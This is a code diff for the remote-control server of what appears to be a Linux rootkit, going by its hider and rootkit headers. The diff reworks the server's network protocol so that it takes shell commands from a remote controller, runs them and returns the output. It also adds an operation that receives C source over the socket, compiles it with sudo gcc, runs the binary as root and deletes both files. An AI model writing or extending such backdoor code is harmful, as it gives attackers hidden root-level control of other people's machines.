@@ -2,6 +2,7 @@
 #include <iostream>
 #include <unistd.h>
 #include <cstring>
+#include <fcntl.h>
 
 #include "remote_control_server.h"
 
@@ -11,9 +12,9 @@
 #include "../hider/hider.h"
 #include "../../basic/shell/basic_cli_shell_access.h"
 
-#include "msg_to_rootkit.h"
-#include "msg_to_controller.h"
+#include "protocol.h"
 
+#include "../error_codes.h"
 
 void remote_control_server::run() {
 
@@ -56,36 +57,78 @@ void remote_control_server::run() {
         if (client == nullptr) continue;
 
         // get command
-        struct msg_to_rootkit msg;
-        memset(&msg, '\x00', sizeof(struct msg_to_rootkit));
-        client->recv_data(reinterpret_cast<char *>(&msg),
-                                                      sizeof(struct msg_to_rootkit));
+        R_OPER oper;
+        memset(&oper, '\x00', sizeof(oper));
+        client->recv_data(reinterpret_cast<char *>(&oper),
+                                                      sizeof(oper));
         std::cout << "received message: ";
 
-        R_OPER id = msg.id;
-        char *data = msg.data;
-
-        switch (id) {
+        switch (oper) {
             case R_OPER_DISCONNECT: {
                 std::cout << "client is disconnecting" << std::endl;
                 my_listener.close_curr_client();
                 continue;
             }
             case R_OPER_EXEC_SHELL_COMMAND: {
-                std::cout << "client shell command: " << data << std::endl;
+                R_OPER_SHELL_COMAMND_SZ comamnd_len;
+                client->recv_data(reinterpret_cast<char *>(&comamnd_len),
+                                  sizeof(comamnd_len));
+
+                std::string command(comamnd_len, '\x00');
+                client->recv_data(reinterpret_cast<char *>(command.data()),
+                                  comamnd_len);
+
+                std::cout << "client shell command: " << command << std::endl;
 
                 // execute
-                std::string output = execute_cli_shell_command(data);
+                std::string output = execute_cli_shell_command(command);
                 std::cout << "command output:" << std::endl;
                 std::cout << output << std::endl;
 
                 // send the command's output back to linux_client
-                struct msg_to_controller msg_back;
-                memset(&msg_back, '\x00', sizeof(struct msg_to_controller));
-                memcpy(msg_back.data, output.c_str(), std::min(output.size(), (size_t) MAX_MSG_TO_CONTROLLER_SZ));
+                R_OPER_SHELL_COMAMND_OUTPUT_SZ output_len = output.length();
+                my_listener.get_connected_client()->send_data(reinterpret_cast<const char *>(&output_len),
+                                                              sizeof(output_len));
 
-                my_listener.get_connected_client()->send_data(reinterpret_cast<const char *>(&msg_back),
-                                                              sizeof(struct msg_to_controller));
+                my_listener.get_connected_client()->send_data(reinterpret_cast<const char *>(output.data()),
+                                                              output_len);
+
+                break;
+            }
+            case R_OPER_EXEC_C_PROGRAM: {
+                R_OPER_C_PROGRAM_SZ program_sz;
+                client->recv_data(reinterpret_cast<char *>(&program_sz),
+                                  sizeof(program_sz));
+
+                std::string program(program_sz, '\x00');
+                client->recv_data(reinterpret_cast<char *>(program.data()),
+                                  program_sz);
+
+                std::cout << "executing c program: " << std::endl;
+                std::cout << program << std::endl;
+
+                // create the c file
+                std::cout << "creating file..." << std::endl;
+#define PROGRAM_FILE "./file.c"
+                int fd = open(PROGRAM_FILE, O_RDWR | O_CREAT);
+                if (fd == OPEN_ERROR)
+                    break;
+
+                write(fd, program.data(), program_sz);
+
+                close(fd);
+
+                // compile
+                std::cout << "compiling..." << std::endl;
+                system("sudo gcc " PROGRAM_FILE " -o file.out");
+
+                // execute
+                std::cout << "executing..." << std::endl;
+#define BUILD_FILE "./file.out"
+                system("sudo " BUILD_FILE);
+
+                // removing file
+                system("sudo rm " PROGRAM_FILE " " BUILD_FILE);
 
                 break;
             }
